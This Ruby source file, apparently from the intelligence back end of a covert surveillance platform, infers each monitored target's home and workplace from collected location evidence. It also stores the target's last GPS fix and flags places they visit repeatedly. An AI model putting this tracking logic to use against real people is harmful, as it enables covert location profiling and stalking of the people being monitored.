#
#  Module for handling position evidence
#

# from RCS::Common
require 'rcs-common/trace'
require_relative 'infer'
require_relative 'position'

module RCS
module Intelligence

class Position
  include Tracer
  extend Tracer

  class << self

    def infer?
      Time.now.utc.sunday?
    end

    # Batch cross-target
    def infer!
      return unless infer?

      trace :info, "Running infer position job..."
      start_time = Time.now

      Entity.targets.each do |entity|
        target = Item.find(entity.target_id)

        infer = Infer.new(target, Time.new(2013, 07, 29))

        desc = "Detected automatically analyzing #{entity.name} movements between #{infer.from} and #{infer.to}"

        save_inferred_position(target, infer.home, "House of #{entity.name}", desc)
        save_inferred_position(target, infer.office, "Workplace of #{entity.name}", desc)
      end

      trace :info, "Infer position job completed in #{Time.now - start_time} sec."
    end

    def save_inferred_position(target, position, name, desc)
      operation_id = target.path[0]

      return unless position

      lon_and_lat = [position[:longitude], position[:latitude]]

      if is_inferred_position_known?(operation_id, lon_and_lat)
        trace :info, "Position #{lon_and_lat.inspect} is already known"
        return
      end

      attributes = {type: :position, path: [operation_id], position: lon_and_lat, level: :suggested,
                    position_attr: {accuracy: position[:radius]}, desc: desc, name: name}

      new_position_entity = Entity.new(attributes)
      new_position_entity.save!
      new_position_entity.fetch_address
    end

    def is_inferred_position_known?(operation_id, lon_and_lat)
      Entity.path_include(operation_id).positions.where(position: lon_and_lat).any?
    end

    def save_last_position(entity, evidence)
      return if evidence[:data]['latitude'].nil? or evidence[:data]['longitude'].nil?

      entity.last_position = {latitude: evidence[:data]['latitude'].to_f,
                              longitude: evidence[:data]['longitude'].to_f,
                              time: evidence[:da],
                              accuracy: evidence[:data]['accuracy'].to_i}
      entity.save!

      trace :info, "Saving last position for #{entity.name}: #{entity.last_position.inspect}"
    end

    def recurring_positions(target, aggregate)
      date = aggregate.day
      min_week_appearence_freq = 3
      a_week_ago = (Date.new(date[0..3].to_i, date[4..5].to_i, date[6..7].to_i) - 7).strftime('%Y%m%d')

      # Select all the position aggregates since a week ago (from the current aggregate day)
      # Group by position.
      # NOTE: it can be one distinct position per day (by design)
      # Take only the aggregates that appear at least 3 times
      recurring = Aggregate.target(target).collection.aggregate([
        { '$match' =>  {'type' => 'position', 'day' => {'$gte' => a_week_ago, '$lt' => date}} },
        { '$group' => {'_id' => '$data.position', cnt: {'$sum' => 1}, rad: {'$min' => '$data.radius'}} },
        { '$match' => {'cnt' => {'$gte' => min_week_appearence_freq}} },
        { '$project' => {_id: 1, rad: 1 } }
      ])

      recurring.map! { |doc| {position: doc["_id"], radius: doc["rad"]} }
    end

    def suggest_recurring_positions(target, aggregate)
      operation_id = target.path[0]

      recurring_positions(target, aggregate).each do |hash|
        attributes = {type: :position, path: [operation_id], position: hash[:position], level: :suggested, position_attr: {accuracy: hash[:radius]}}
        new_position_entity = Entity.new(attributes)

        similar_position_entity = Entity.path_include(operation_id).positions_within(new_position_entity.position).to_a.find { |e|
          e.to_point.similar_to?(new_position_entity.to_point)
        }

        next if similar_position_entity

        new_position_entity.save!
        new_position_entity.fetch_address
      end
    end
  end
end

end
end

